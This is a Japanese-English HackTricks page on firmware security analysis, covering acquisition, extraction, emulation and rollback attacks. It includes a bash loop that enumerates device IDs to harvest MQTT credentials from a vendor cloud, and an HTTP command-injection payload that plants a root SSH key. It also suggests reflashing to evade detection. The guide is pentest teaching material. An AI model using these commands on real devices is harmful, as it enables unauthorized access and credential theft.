# ファームウェア解析

{{#include ../../banners/hacktricks-training.md}}

## **導入**

### 関連リソース


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


ファームウェアは、ハードウェアコンポーネントとユーザーが触れるソフトウェア間の通信を管理・仲介することで、デバイスが正しく動作するために不可欠なソフトウェアです。不揮発性メモリに格納され、電源投入直後から重要な指示にアクセスできるようにしてOSの起動につながります。ファームウェアを調査・改変することは、セキュリティ脆弱性を特定する上で重要な工程です。

## **情報収集**

**情報収集**は、デバイスの構成や利用されている技術を理解するための重要な初期ステップです。このプロセスでは以下の情報を収集します:

- 実行されている CPU アーキテクチャと OS
- ブートローダの詳細
- ハードウェア構成とデータシート
- コードベースのメトリクスとソースの場所
- 外部ライブラリとライセンス種別
- 更新履歴や認証／規制情報
- アーキテクチャ図やフローダイアグラム
- セキュリティ評価や特定された脆弱性

この目的のため、**open-source intelligence (OSINT)** ツールは非常に有用であり、利用可能なオープンソースソフトウェアコンポーネントの手動および自動のレビューも重要です。Tools like [Coverity Scan](https://scan.coverity.com) and [Semmle’s LGTM](https://lgtm.com/#explore) offer free static analysis that can be leveraged to find potential issues.

## **ファームウェアの取得**

ファームウェアの入手は、各手法で難易度が異なるいくつかの方法で行えます:

- **開発者やメーカーなどのソースから直接**入手する
- **提供された指示から**ビルドする
- **公式サポートサイトから**ダウンロードする
- ホストされているファームウェアファイルを見つけるために **Google dork** クエリを利用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner) のようなツールで **クラウドストレージに直接アクセス**する
- **man-in-the-middle** 技術でアップデートを傍受する
- **UART**, **JTAG**, **PICit** などの接続経由でデバイスから抽出する
- デバイス通信内の更新リクエストを **Sniffing** する
- ハードコードされた更新エンドポイントを特定して使用する
- ブートローダやネットワークから **Dumping** する
- 最終手段として、適切なハードウェアツールを用いて **ストレージチップを取り外して読み取る**

## ファームウェアの解析

ファームウェアを入手したら、それをどのように扱うかを判断するために情報を抽出する必要があります。以下のようなツールを使用できます：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
もしそれらのツールであまり見つからない場合は、イメージの**エントロピー**を `binwalk -E <bin>` で確認してください。エントロピーが低ければ暗号化されている可能性は低く、エントロピーが高ければ暗号化（あるいは何らかの圧縮）が施されている可能性が高いです。

さらに、これらのツールを使って**files embedded inside the firmware**を抽出できます:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または [**binvis.io**](https://binvis.io/#/)（[code](https://code.google.com/archive/p/binvis/)）を使ってファイルを可視化／調査できます。

### ファイルシステムの取得

`binwalk -ev <bin>` のような前述のツールで、**extract the filesystem**できているはずです。\
Binwalk は通常、**folder named as the filesystem type**という名前のフォルダの中に抽出します。一般的な種類は次のいずれかです: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs。

#### 手動によるファイルシステム抽出

場合によっては、binwalk が **not have the magic byte of the filesystem in its signatures**ことがあります。その場合は、binwalk を使ってファイルシステムのオフセットを見つけ、バイナリから圧縮されたファイルシステムを**find the offset of the filesystem and carve the compressed filesystem**し、その種類に応じて以下の手順でファイルシステムを**manually extract**してください。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
以下の **dd command** を実行して、Squashfs filesystem をカービングしてください。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
または、次のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上記の例で使用）

`$ unsquashfs dir.squashfs`

ファイルはその後 `squashfs-root` ディレクトリに配置されます。

- CPIO アーカイブファイルの場合

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 ファイルシステムの場合

`$ jefferson rootfsfile.jffs2`

- NAND フラッシュを使用する ubifs ファイルシステムの場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## ファームウェアの解析

ファームウェアを取得したら、その構造や潜在的な脆弱性を理解するために解析することが重要です。このプロセスでは、ファームウェアイメージから有用なデータを分析・抽出するために様々なツールを利用します。

### 初期解析ツール

バイナリファイル（以下 `<bin>` と表記）の初期検査のためのコマンド群を示します。これらのコマンドは、ファイルタイプの識別、文字列の抽出、バイナリデータの解析、パーティションやファイルシステムの詳細の把握に役立ちます：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
イメージの暗号化状況を評価するために、**エントロピー** を `binwalk -E <bin>` で確認します。エントロピーが低ければ暗号化されていない可能性を示し、高ければ暗号化または圧縮されている可能性を示します。

**埋め込まれたファイル** を抽出するには、**file-data-carving-recovery-tools** のドキュメントや、ファイル検査用の **binvis.io** などのツールやリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使えば通常、ファイルシステムを抽出でき、多くの場合そのファイルシステム名（例: squashfs, ubifs）を冠したディレクトリに展開されます。しかし、magic bytes が欠けて **binwalk** がファイルシステムの種類を認識できない場合は、手動で抽出する必要があります。これは `binwalk` でファイルシステムのオフセットを特定し、続いて `dd` コマンドでファイルシステムを切り出す操作を行うことを含みます:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Afterwards, depending on the filesystem type (e.g., squashfs, cpio, jffs2, ubifs), different commands are used to manually extract the contents.

### Filesystem Analysis

ファイルシステムを抽出したら、セキュリティ上の脆弱性の探索を開始します。注目するのは、不安全なネットワークデーモン、ハードコーディングされた認証情報、API endpoints、アップデートサーバ機能、未コンパイルのコード、起動スクリプト、およびオフライン解析用のコンパイル済みバイナリです。

**Key locations** と **items** to inspect include:

- **etc/shadow** と **etc/passwd**（ユーザー認証情報）
- **etc/ssl** 内の SSL 証明書と鍵
- 潜在的な脆弱性を含む設定ファイルやスクリプトファイル
- さらなる解析のための埋め込みバイナリ
- 一般的な IoT デバイスの Web サーバやバイナリ

ファイルシステム内の機密情報や脆弱性を露見させるのに役立つツールがいくつかあります:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker) は機密情報の検索に用います
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) は包括的なファームウェア解析に役立ちます
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) は静的および動的解析に役立ちます

### Security Checks on Compiled Binaries

ファイルシステムで見つかったソースコードとコンパイル済みバイナリの両方を脆弱性について精査する必要があります。Unix バイナリ向けの **checksec.sh** や Windows バイナリ向けの **PESecurity** のようなツールは、悪用されうる保護されていないバイナリを特定するのに役立ちます。

## Harvesting cloud config and MQTT credentials via derived URL tokens

多くの IoT ハブは、デバイスごとの設定を次のようなクラウドエンドポイントから取得します:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

ファームウェア解析中に、<token> がデバイスIDからハードコードされた秘密を使ってローカルで生成されていることが判明することがあります。例えば:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計により、deviceId と STATIC_KEY を把握した者は誰でも URL を再構築してクラウド設定を取得でき、しばしばプレーンテキストの MQTT 認証情報やトピックプレフィックスが露呈します。

Practical workflow:

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- クラウド設定のURLパターンとブローカーのアドレスを出力している行を探します。例えば:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) ファームウェアから STATIC_KEY とトークンアルゴリズムを復元する

- バイナリを Ghidra/radare2 に読み込み、設定パス ("/pf/") や MD5 の使用箇所を検索する。
- アルゴリズムを確認する（例: MD5(deviceId||STATIC_KEY)）。
- Bash でトークンを算出し、ダイジェストを大文字化する:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) クラウド設定とMQTT認証情報を収集する

- URLを組み立て、curlでJSONを取得し、jqで解析してsecretsを抽出する:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 平文の MQTT と弱い topic ACLs（存在する場合）の悪用

- 回収した credentials を使って maintenance topics を subscribe し、sensitive events を探す:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 予測可能な device IDs を列挙する（大規模に、認可のもとで）

- 多くのエコシステムはベンダー OUI/product/type bytes を埋め込み、その後に連続するサフィックスが続く。
- 候補 IDs を反復し、tokens を導出し、configs をプログラムで取得できる：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
注意
- mass enumeration を試みる前に、必ず明示的な許可を取得してください。
- 可能な場合は、ターゲットハードウェアを変更せずに秘密を回収するために emulation または static analysis を優先してください。

ファームウェアを emulation するプロセスは、デバイスの動作全体または個々のプログラムのいずれかの **dynamic analysis** を可能にします。このアプローチはハードウェアやアーキテクチャの依存性で課題に直面することがありますが、root filesystem や特定のバイナリを Raspberry Pi のようなアーキテクチャと endianness が一致するデバイス、または事前構築された仮想マシンに移すことで、さらなるテストを容易にできます。

### 個別バイナリの emulation

単一のプログラムを調べる場合、プログラムの endianness と CPU architecture を特定することが重要です。

#### MIPS Architecture の例

MIPS architecture のバイナリを emulation するには、次のコマンドを使用できます:
```bash
file ./squashfs-root/bin/busybox
```
必要なエミュレーションツールをインストールするには:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

ARM バイナリの場合もプロセスは同様で、`qemu-arm` エミュレータを使用してエミュレーションを行います。

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dynamic Analysis in Practice

この段階では、実機またはエミュレートされたデバイス環境のいずれかを使用して分析を行います。OS と filesystem への shell アクセスを維持することが必須です。エミュレーションはハードウェアとの相互作用を完全に再現できないことがあり、時折エミュレーションを再起動する必要があります。分析では filesystem を再調査し、公開されているウェブページや network services を攻撃し、bootloader の脆弱性を調査すべきです。firmware の整合性テストは、潜在的な backdoor 脆弱性を特定するうえで重要です。

## Runtime Analysis Techniques

Runtime analysis は、プロセスやバイナリをその実行環境内で操作することを指し、gdb-multiarch、Frida、Ghidra といったツールを使ってブレークポイントを設定し、fuzzing などの手法で脆弱性を特定します。

## Binary Exploitation and Proof-of-Concept

特定した脆弱性に対する PoC を作成するには、ターゲットアーキテクチャの深い理解と低レイヤ言語でのプログラミングが必要です。組み込みシステムでの binary runtime protections は稀ですが、存在する場合は Return Oriented Programming (ROP) のような技術が必要になることがあります。

## Prepared Operating Systems for Firmware Analysis

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は IoT デバイスの security assessment と penetration testing を行うためのディストリビューションです。必要なツールが事前にすべて組み込まれた pre-configured 環境を提供することで多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): EmbedOS は Ubuntu 18.04 をベースにした embedded security testing 向けの OS で、firmware セキュリティテスト用ツールがプリロードされています。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

ベンダが firmware image に対して暗号署名検証を実装していても、**version rollback (downgrade) 保護がしばしば省略されている**ことがあります。boot- または recovery-loader が埋め込まれた公開鍵で署名のみを検証し、フラッシュされるイメージの *version*（または monotonic counter）を比較しない場合、攻撃者は有効な署名を保持する **古い脆弱な firmware を正当にインストール** でき、パッチ済みの脆弱性を再導入できます。

Typical attack workflow:

1. **Obtain an older signed image**
   * ベンダの公開ダウンロードポータル、CDN、サポートサイトから入手する。
   * companion mobile/desktop applications から抽出する（例: Android APK の中の `assets/firmware/`）。
   * VirusTotal、Internet archives、forums 等のサードパーティリポジトリから取得する。
2. **Upload or serve the image to the device** via any exposed update channel:
   * Web UI, mobile-app API, USB, TFTP, MQTT, etc.
   * 多くの consumer IoT デバイスは *unauthenticated* な HTTP(S) エンドポイントを公開しており、Base64-encoded firmware blobs を受け取り、サーバー側でデコードして recovery/upgrade をトリガーします。
3. ダウングレード後、新しいリリースでパッチされた脆弱性（例: 後になって追加された command-injection フィルタ）を悪用します。
4. オプションで、永続化を得た後に検出を避けるため最新イメージを再度フラッシュするか、アップデートを無効化します。

### 例: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
脆弱な（downgraded）ファームウェアでは、`md5` パラメータがサニタイズされることなく直接 shell command に連結されており、任意のコマンド注入を許します（ここでは SSH のキー認証を使った root アクセスを有効化する例）。後のファームウェアでは基本的な文字フィルタが導入されましたが、downgrade 保護がないためその修正は効果を成しません。

### モバイルアプリからのファームウェア抽出

多くのベンダは、アプリが Bluetooth/Wi-Fi 経由でデバイスを更新できるように、コンパニオンのモバイルアプリ内にフルのファームウェアイメージを同梱しています。これらのパッケージは、`assets/fw/` や `res/raw/` のようなパスで APK/APEX の中に平文で格納されていることが多いです。`apktool`、`ghidra`、あるいは単純な `unzip` といったツールを使えば、物理ハードウェアに触れることなく署名済みイメージを取り出せます。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 更新ロジック評価のチェックリスト

* 更新エンドポイントの通信/認証は十分に保護されていますか（TLS + authentication）？
* デバイスはフラッシュする前に **version numbers** または **monotonic anti-rollback counter** を比較していますか？
* イメージは secure boot chain の中で検証されていますか（例: signatures checked by ROM code）？
* userland code は追加の妥当性チェック（例: allowed partition map、model number）を行いますか？
* *partial* または *backup* の update フローは同じ検証ロジックを再利用していますか？

> 💡  上記のどれかが欠けている場合、そのプラットフォームはおそらく rollback attacks に対して脆弱です。

## 練習用の脆弱なファームウェア

ファームウェアの脆弱性発見を練習するには、以下の脆弱なファームウェアプロジェクトを出発点として使ってください。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 参考資料

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## トレーニングと認定

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
